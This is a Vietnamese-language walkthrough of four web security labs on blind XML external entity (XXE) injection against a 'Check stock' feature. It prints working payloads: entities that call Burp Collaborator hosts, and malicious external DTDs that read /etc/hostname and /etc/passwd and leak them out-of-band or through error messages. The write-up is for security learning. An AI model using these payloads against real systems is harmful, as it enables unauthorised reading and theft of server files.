# Blind XXE with out-of-band interaction
## Target Goal
This lab has a "Check stock" feature that parses XML input but does not display the result.

You can detect the blind XXE vulnerability by triggering out-of-band interactions with an external domain.

To solve the lab, use an external entity to make the XML parser issue a DNS lookup and HTTP request to Burp Collaborator.
## Analysis
Đối với mục tiêu của bài lab, ta sẽ tấn công vào tính năng `Check stock`

![image](https://github.com/user-attachments/assets/c4e4879e-fd4a-48dd-be7b-a0026156528b)

Sử dụng Burp để xem nội dung gói tin 

![image](https://github.com/user-attachments/assets/c959594f-458a-4565-86b6-94f133f2d92d)

Ta sẽ tiến hành inject payload sâu vào value `<productId>`, đồng thời sử dụng `Burp Collab` để hứng được gói tin được gửi ra ngoài
```
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://wbbon1ycp405g804xc71lztj6ac10rog.oastify.com"> ]>
```
![image](https://github.com/user-attachments/assets/5ed72244-8255-4219-ba5f-f11c1e83683f)

Quay lại tab `Collaborator` sẽ hứng được request và hoàn thành bài lab

![image](https://github.com/user-attachments/assets/c1009cc0-717c-4914-af65-d88523ad4f92)

## Flag
![image](https://github.com/user-attachments/assets/0a09e66c-350e-49ca-9e1c-745458d6ba93)

# Blind XXE with out-of-band interaction via XML parameter entities
## Target Goal
This lab has a "Check stock" feature that parses XML input, but does not display any unexpected values, and blocks requests containing regular external entities.

To solve the lab, use a parameter entity to make the XML parser issue a DNS lookup and HTTP request to Burp Collaborator.
## Analysis
Đối với mục tiêu của bài lab, ta sẽ tấn công vào tính năng `Check stock`

![image](https://github.com/user-attachments/assets/dc798007-a016-4abd-874e-d739136d33b3)

Sử dụng Burp để xem nội dung gói tin 

![image](https://github.com/user-attachments/assets/59a8f0d5-2224-40ac-934b-93ef1b7c47b3)

Ta sẽ tiến hành inject payload sâu vào value `<productId>`, đồng thời sử dụng `Burp Collab` để hứng được gói tin được gửi ra ngoài. Theo như Response, quả thực khi trỏ tới XML Entity ta đã bị trang web chặn lại
```
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://wbbon1ycp405g804xc71lztj6ac10rog.oastify.com"> ]>
```
![image](https://github.com/user-attachments/assets/2bbe2db7-ed8d-4588-b20c-55764e996aae)

Để thực hiện **Out-Of-Band Interaction** trong trường hợp này, mình sẽ phải sửa `DOCTYPE` để không chỉ định nghĩa `Entity` có thể trực tiếp truy vấn tới nó luôn mà không thông qua productID.  Do đó thay vì sử dụng XML entity, ta sẽ định nghĩa 1 XML parameter Entity với payload:
```
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://wbbon1ycp405g804xc71lztj6ac10rog.oastify.com"> %xxe; ]>
```

![image](https://github.com/user-attachments/assets/dda52fa7-9bc7-4425-b03f-6afd9ce6d28f)

Dù trả về `XML parsing error` nhưng trong BurpCollab đã xuất hiện kết nối DNS và HTTP tức là hứng được request và hoàn thành bài lab

![image](https://github.com/user-attachments/assets/6bf678ed-2aad-4984-b182-9cbdaa530943)

## Flag
![image](https://github.com/user-attachments/assets/f8cab389-2f90-45e5-b627-a7f3a416034a)

# Exploiting blind XXE to exfiltrate data using a malicious external DTD
## Target Goal
This lab has a "Check stock" feature that parses XML input but does not display the result.

To solve the lab, exfiltrate the contents of the `/etc/hostname` file.
## Analysis
Đối với mục tiêu của bài lab, ta sẽ tấn công vào tính năng `Check stock`

![image](https://github.com/user-attachments/assets/2ebc71f1-78fb-4d7e-9648-16e224ac4f6c)

Sử dụng Burp để xem nội dung gói tin 

![image](https://github.com/user-attachments/assets/1fe49bc7-cba2-47b1-80bc-5d2e9e8f6da1)

Đầu tiên ta xác nhận có kết nối tới BurpCollab với payload:
```
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://wbbon1ycp405g804xc71lztj6ac10rog.oastify.com"> %xxe; ]>
```

![image](https://github.com/user-attachments/assets/55272b78-693f-4a4e-8bba-c8cecd60a183)

Tiếp theo truy cập vào `Exploit Server` được bài lab cung cấp và paste payload này vào Body. `Store` lại

```
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://uus1buupthb8nyod33fcs5wpogu7ix6m.oastify.com/?x=%file;'>">
%eval;
%exfiltrate;
```

![image](https://github.com/user-attachments/assets/fa69d86d-61cd-464d-9bf5-5f5fdb3c8971)

Copy đường dẫn tới file. Sau đó kết hợp với XML Paremeter phía trước để tạo ra payload hoàn chỉnh:
```
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "https://exploit-0ab70010039193fb80c166ec011700db.exploit-server.net/exploit.dtd"> %xxe; ]>
```

Quay lại Collaborator lấy được code và hoàn thành bài lab

![image](https://github.com/user-attachments/assets/c609ebe9-d6bc-435a-9243-10527bcb7e75)

## Flag
![image](https://github.com/user-attachments/assets/abc1dd1d-400c-4e31-9ef0-93a374758f1a)

# Exploiting blind XXE to retrieve data via error messages
## Target Goal
This lab has a "Check stock" feature that parses XML input but does not display the result.

To solve the lab, use an external DTD to trigger an error message that displays the contents of the`/etc/passwd` file.

The lab contains a link to an exploit server on a different domain where you can host your malicious DTD.
## Analysis
Đối với mục tiêu của bài lab, ta sẽ tấn công vào tính năng `Check stock`

![image](https://github.com/user-attachments/assets/ca7567e8-72fc-4535-804f-0b9196276c5e)

Sử dụng Burp để xem nội dung gói tin 

![image](https://github.com/user-attachments/assets/74c76974-56ab-4a61-a244-d1294abab789)

Payload này sẽ đọc nội dung của file mục tiêu nhưng sau đó sẽ chèn vào đường dẫn `invalid/` . Đúng như tên gọi thì filepath này thường sẽ không hợp lệ -> Gây ra lỗi -> In ra Error message:
```
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'file:///invalid/%file;'>">
%eval;
%exfil;
```

Giống với bài lab trước: Copy vào `Exploit Server` -> `Store` -> Định nghĩa XML Parameter với đường dẫn tới DTD file trên exploit server -> Chèn vào XML của request `checkStock`

![image](https://github.com/user-attachments/assets/c5be980a-45bf-4da1-9641-d31f9b68ab16)
```
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "https://exploit-0a3b00f0034fcb8186a2dd44018200cf.exploit-server.net/exploit"> %xxe; ]>
```
![image](https://github.com/user-attachments/assets/ec39a48d-8d2a-4d94-904b-7a1fdca8c57a)

## Flag
![image](https://github.com/user-attachments/assets/ac59c477-b6a5-4938-a0ee-1723cf9cb8ca)






